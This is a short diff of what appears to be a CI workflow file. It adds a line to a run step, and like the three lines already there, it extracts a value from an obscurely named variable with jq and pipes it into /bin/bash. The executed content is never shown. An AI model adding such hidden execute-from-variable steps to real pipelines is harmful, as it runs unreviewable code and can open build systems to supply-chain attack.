@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$p30318" | jq -r .v876 | /bin/bash
           echo $r03159 | jq -r .iug99621 | /bin/bash
           echo $ekfn4 | jq -r .xjcuh3224 | /bin/bash
+          printf '%s' "$vog3" | jq -r .x02 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
